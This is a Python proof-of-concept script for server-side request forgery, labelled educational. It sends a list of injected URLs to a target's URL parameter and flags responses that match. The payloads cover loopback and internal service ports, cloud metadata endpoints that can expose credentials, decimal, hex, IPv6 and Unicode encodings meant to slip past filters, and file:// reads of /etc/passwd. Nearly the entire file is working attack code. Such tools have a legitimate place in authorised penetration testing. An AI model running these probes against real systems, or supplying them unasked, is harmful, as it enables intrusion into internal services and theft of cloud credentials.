#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) PoC
=======================================
Demonstrates SSRF by injecting internal/loopback URLs into a user-controlled
URL parameter and checking whether the server fetches and returns the content.

DISCLAIMER: For educational and research purposes only.
Only run against systems you own or have explicit written permission to test.
"""

import argparse
import sys

try:
    import requests
    from colorama import Fore, Style, init as colorama_init
except ImportError:
    sys.exit("Missing dependencies. Run: pip install -r requirements.txt")

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[1]))
from utils import build_session  # noqa: E402

colorama_init(autoreset=True)

DISCLAIMER = (
    f"{Fore.YELLOW}[!] DISCLAIMER: This tool is for educational/research purposes only.\n"
    f"    Only use against systems you own or have explicit written permission to test.{Style.RESET_ALL}"
)

# Heuristic thresholds for the "no-signature" SSRF detection path
SUCCESS_STATUS_CODE = 200        # HTTP status code we expect for a valid fetch
MIN_RESPONSE_LENGTH = 20         # Minimum bytes to consider a response non-trivial

# ── SSRF target probes ───────────────────────────────────────────────────────
# Each entry: (url_to_inject, content_signature_if_any, description)
SSRF_PROBES: list[tuple[str, str, str]] = [
    # Loopback / localhost
    ("http://127.0.0.1/",           "",                     "HTTP localhost root"),
    ("http://localhost/",           "",                     "HTTP localhost (name)"),
    ("http://0.0.0.0/",             "",                     "HTTP 0.0.0.0"),
    # Cloud metadata services (AWS, GCP, Azure)
    ("http://169.254.169.254/latest/meta-data/",
     "instance-id",                 "AWS EC2 metadata"),
    ("http://169.254.169.254/metadata/v1/",
     "",                            "DigitalOcean metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     "",                            "GCP metadata"),
    ("http://169.254.169.254/metadata/instance",
     "compute",                     "Azure IMDS"),
    # Internal services (common ports)
    ("http://127.0.0.1:22/",        "SSH",                  "SSH on localhost"),
    ("http://127.0.0.1:3306/",      "",                     "MySQL on localhost"),
    ("http://127.0.0.1:6379/",      "",                     "Redis on localhost"),
    ("http://127.0.0.1:8080/",      "",                     "Alt HTTP on localhost"),
    # Alternative schemes / bypasses
    ("http://2130706433/",          "",                     "Localhost as decimal IP"),
    ("http://0x7f000001/",          "",                     "Localhost as hex IP"),
    ("http://[::1]/",               "",                     "Localhost as IPv6"),
    ("http://①②⑦.⓪.⓪.①/",         "",                     "Localhost Unicode obfuscation"),
    # File scheme (often blocked, but worth testing)
    ("file:///etc/passwd",          "root:",                "Local /etc/passwd via file://"),
    ("file:///c:/windows/win.ini",  "[fonts]",              "Windows win.ini via file://"),
]


def probe(
    session: requests.Session,
    target_url: str,
    param: str,
    ssrf_url: str,
    signature: str,
    description: str,
    timeout: int,
) -> bool:
    """Inject ssrf_url into param and check whether the server fetched it."""
    try:
        resp = session.get(target_url, params={param: ssrf_url}, timeout=timeout)
        body = resp.text

        # Heuristic 1: known content signature
        if signature and signature in body:
            print(
                f"{Fore.RED}[+] SSRF confirmed (signature match)!\n"
                f"    Probe       : {description}\n"
                f"    Injected URL: {ssrf_url}\n"
                f"    Signature   : {signature!r}\n"
                f"    HTTP Status : {resp.status_code}\n"
                f"    Snippet     : {body[:300]!r}"
            )
            return True

        # Heuristic 2: non-trivial response returned when no signature known
        is_success = resp.status_code == SUCCESS_STATUS_CODE
        is_non_trivial = len(body) > MIN_RESPONSE_LENGTH
        is_non_html = "<html" not in body.lower()
        if not signature and is_success and is_non_trivial and is_non_html:
            print(
                f"{Fore.YELLOW}[?] Possible SSRF (no signature, but non-HTML body received):\n"
                f"    Probe       : {description}\n"
                f"    Injected URL: {ssrf_url}\n"
                f"    HTTP Status : {resp.status_code}\n"
                f"    Snippet     : {body[:200]!r}"
            )
            return True

        print(f"{Fore.GREEN}[-] No response for: {description}")
    except requests.RequestException as exc:
        print(f"{Fore.YELLOW}[-] Request error ({description}): {exc}")
    return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SSRF PoC – educational purposes only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--url",     required=True, help="Target URL of the vulnerable endpoint")
    parser.add_argument("--param",   default="url", help="Parameter that accepts a URL (default: url)")
    parser.add_argument("--cookies", default=None,  help="Session cookies, e.g. 'PHPSESSID=abc; security=low'")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    args = parser.parse_args()

    print(DISCLAIMER)
    print(f"\n{Fore.CYAN}[*] Target : {args.url}")
    print(f"{Fore.CYAN}[*] Param  : {args.param}\n")

    session = build_session(args.cookies, user_agent="SSRF-PoC/1.0 (educational)")
    found = False

    for ssrf_url, signature, description in SSRF_PROBES:
        print(f"{Fore.CYAN}[*] Probing: {description}")
        if probe(session, args.url, args.param, ssrf_url, signature, description, args.timeout):
            found = True

    print()
    if found:
        print(f"{Fore.RED}[!] Target may be vulnerable to SSRF.")
    else:
        print(f"{Fore.GREEN}[✓] No SSRF indicators found with tested payloads.")


if __name__ == "__main__":
    main()
